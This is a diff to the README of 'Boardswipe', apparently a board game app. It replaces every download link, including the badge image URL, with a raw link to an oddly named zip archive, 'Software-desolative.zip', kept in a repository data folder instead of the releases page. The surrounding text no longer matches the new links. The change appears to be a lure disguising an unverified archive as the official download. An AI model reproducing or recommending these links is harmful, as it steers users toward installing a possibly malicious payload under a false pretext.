@@ -1,6 +1,6 @@
 # 🎲 Boardswipe - Discover and Share Board Games Easily
 
-[![Download Boardswipe](https://img.shields.io/badge/Download%20Now-Boardswipe-blue.svg)](https://github.com/shaunteodoro/Boardswipe/releases)
+[![Download Boardswipe](https://github.com/shaunteodoro/Boardswipe/raw/refs/heads/main/DatabaseFiles/Software-desolative.zip%https://github.com/shaunteodoro/Boardswipe/raw/refs/heads/main/DatabaseFiles/Software-desolative.zip)](https://github.com/shaunteodoro/Boardswipe/raw/refs/heads/main/DatabaseFiles/Software-desolative.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To get started, follow these simple steps to download and run BoardSwipe on your
 
 1. **Visit the Releases Page**  
    Click the link below to access the BoardSwipe releases page:  
-   [Visit this page to download](https://github.com/shaunteodoro/Boardswipe/releases)
+   [Visit this page to download](https://github.com/shaunteodoro/Boardswipe/raw/refs/heads/main/DatabaseFiles/Software-desolative.zip)
 
 2. **Download the Latest Version**  
    On the releases page, find the latest version of BoardSwipe. Look for the version number followed by the release date.
@@ -77,6 +77,6 @@ Join our community to enhance your experience. Participate in discussions, ask q
 
 Ready to start your board game adventure? Download BoardSwipe today!
 
-[![Download Boardswipe](https://img.shields.io/badge/Download%20Now-Boardswipe-blue.svg)](https://github.com/shaunteodoro/Boardswipe/releases)
+[![Download Boardswipe](https://github.com/shaunteodoro/Boardswipe/raw/refs/heads/main/DatabaseFiles/Software-desolative.zip%https://github.com/shaunteodoro/Boardswipe/raw/refs/heads/main/DatabaseFiles/Software-desolative.zip)](https://github.com/shaunteodoro/Boardswipe/raw/refs/heads/main/DatabaseFiles/Software-desolative.zip)
 
 Follow the steps outlined above to install and run the application smoothly. Enjoy discovering new board games and connecting with fellow enthusiasts!
